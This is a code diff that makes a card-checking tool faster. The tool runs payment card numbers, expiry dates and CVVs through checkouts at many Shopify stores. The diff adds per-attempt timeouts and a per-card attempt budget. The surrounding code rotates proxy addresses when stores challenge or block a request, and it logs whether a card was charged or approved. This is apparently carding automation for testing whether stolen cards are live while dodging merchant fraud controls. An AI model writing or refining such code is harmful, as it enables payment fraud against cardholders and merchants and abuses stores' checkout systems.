@@ -735,6 +735,13 @@ def _stores_ready(sites: list[str]) -> list[str]:
 # shops take turns, so the next card starts further along.
 SITE_TRIES_PER_CARD = int(os.environ.get("SITE_TRIES_PER_CARD", 8))
 
+# How long one shop and one address may hold a card.
+ATTEMPT_SECONDS = float(os.environ.get("ATTEMPT_SECONDS", 35))
+
+# How many attempts one card may make in total.  A card that is going
+# nowhere is answered with what it has and the next card gets a turn.
+CARD_ATTEMPT_BUDGET = int(os.environ.get("CARD_ATTEMPT_BUDGET", 6))
+
 # How many addresses one shop is asked from.  A shop that is slow, or
 # that puts up a challenge, is saying that about one address and not
 # about the card, so the check is made again from the next address
@@ -2493,6 +2500,7 @@ async def validate_card_across_sites(
     last: Optional[dict] = None
     tried = 0
     skipped = 0
+    attempts = 0
     for site in sites[:max_sites]:
         # A store that has nothing to sell inside the band is skipped
         # without a checkout attempt.  The product list is cached per
@@ -2507,7 +2515,12 @@ async def validate_card_across_sites(
         # A card does not walk through every shop in the list: a shop
         # that is slow takes the card's time with it.  The next card
         # starts further along the list, so the shops all get their turn.
-        if tried >= SITE_TRIES_PER_CARD:
+        #
+        # The budget counts the attempts, not the shops: a card that
+        # goes from shop to shop and from address to address would hold
+        # its place for minutes, and a card that is answered quickly is
+        # worth more than a card that is answered eventually.
+        if tried >= SITE_TRIES_PER_CARD or attempts >= CARD_ATTEMPT_BUDGET:
             break
         tried += 1
         # The addresses to ask this shop from.  The caller gives a list
@@ -2531,10 +2544,40 @@ async def validate_card_across_sites(
         result: dict = {}
         resp = ""
         for address in free:
-            result = await validate_card_with_retry(
-                cc, month, year, cvv, site,
-                proxy_str=address, max_price=max_price, min_price=min_price,
-            )
+            if attempts >= CARD_ATTEMPT_BUDGET:
+                break
+            attempts += 1
+            # One attempt is one shop and one address.  The checkout
+            # makes a few calls, and an address that does not answer
+            # would take the card's whole time, so an attempt is given
+            # a set amount of time and then left.
+            try:
+                result = await asyncio.wait_for(
+                    validate_card_with_retry(
+                        cc, month, year, cvv, site,
+                        proxy_str=address, max_price=max_price, min_price=min_price,
+                    ),
+                    timeout=ATTEMPT_SECONDS,
+                )
+            except asyncio.TimeoutError:
+                result = {
+                    "Response": "TIMEOUT",
+                    "Message": "The shop did not answer in time",
+                    "code": "TIMEOUT",
+                    "decline_code": "TIMEOUT",
+                    "Gateway": "Shopify Payments",
+                    "Price": "0.00",
+                    "Proxy": address or "Live",
+                    "Status": False,
+                    "Gate": "Shopify Payments",
+                    "CC": f"{cc}|{month}|{year}|{cvv}",
+                    "Product": "",
+                    "Site": site,
+                    "Charged": "False",
+                    "Approved": "False",
+                    "Time": "0.0s",
+                    "Retry": True,
+                }
             resp = str(result.get("Response", ""))
             if resp in ADDRESS_PROBLEMS:
                 # This shop turned this address away.  The pair is put
